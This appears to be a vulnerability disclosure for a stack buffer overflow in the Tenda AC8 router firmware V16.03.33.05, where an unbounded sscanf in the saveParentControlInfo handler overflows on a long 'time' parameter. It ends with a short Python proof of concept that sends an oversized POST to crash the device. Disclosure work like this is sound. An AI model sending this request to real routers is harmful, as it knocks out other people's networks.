# TARGET

- **Device:** Tenda AC8
- **Firmware Version:** V16.03.33.05
- **Vendor Website:** https://www.tendacn.com/
- **Firmware Reference:** AC8v4.0 Firmware - Tenda Global (English)
- ![image-20260202092533671](fastsettingwifiset-timezome.assets/image-20260202092533671.png)

------

# BUG TYPE

This issue is classified as a **Stack-Based Buffer Overflow Vulnerability**, caused by improper input validation in the router’s HTTP service interface.

# Abstract

A buffer overflow vulnerability exists in the **Tenda AC8 router** running firmware version **V16.03.33.05**.
 The flaw originates from the `saveParentControlInfo` interface in the embedded `httpd` service, which fails to properly validate user-supplied input in the `time` parameter.

An attacker can exploit this vulnerability by sending a specially crafted HTTP request with an overly long `time` value, potentially leading to  a denial-of-service condition.

------

# Details

## Vulnerability Description

The Tenda AC8 router contains a buffer overflow vulnerability in firmware version **V16.03.33.05**.
 The issue lies in the `saveParentControlInfo` endpoint, where the `httpd` service does not effectively filter or validate the length of the `time` parameter.

Because input data is not correctly checked, a remote attacker can trigger memory corruption by supplying an excessively long string. This may result in arbitrary code execution or cause the device to crash.

------

## Vulnerability Analysis

Using IDA Pro, the vulnerability can be observed in the `httpd` binary, within the function `saveParentControlInfo`.

![image-20260202092931605](saveParentControlInfo-time.assets/image-20260202092931605.png)

![image-20260202092941904](saveParentControlInfo-time.assets/image-20260202092941904.png)

A vulnerability was identified in the function `compare_parentcontrol_time`, which is invoked at line` 22` of the program. The function entry point was located at address `0x00488274`during reverse engineering analysis.

Further inspection revealed that this function performs unsafe string parsing and copying operations, introducing a potential stack-based buffer overflow condition.

**User-Controlled Input Retrieval**

- The `time` parameter is entirely **user-controlled**

- No effective validation is applied to its length or content

- This allows an attacker to supply arbitrarily long input values

**Unsafe Parsing with `sscanf`**

The vulnerable code uses `sscanf` to parse the input:

```
sscanf(input, "%[^-]-%s", v3, v4);
```

In this operation:

- The format specifiers `%[^-]` and `%s` **do not enforce any length limits**
- The parsed data is written into fixed-size stack buffers (`v3` and `v4`)
- These buffers are only approximately **32–36 bytes** in size

As a result, any input exceeding the buffer capacity will cause `sscanf` to write beyond the intended memory boundaries.

------

# POC

The following proof-of-concept demonstrates how the vulnerability can be triggered:

```
import requests
url = "http://10.10.10.1/goform/ saveParentControlInfo"
data = {
        b"time":b'a'*0x10000,
        b"ssid":b'12345'
    	}
res = requests.post(url=url,data=data)
print(res.content)
```

## Expected Result

Running the exploit produces a **Segmentation Fault**, indicating that the program attempted to access an invalid memory address. This confirms the presence of a serious memory safety issue.

![image-20260202092900925](saveParentControlInfo-time.assets/image-20260202092900925.png)

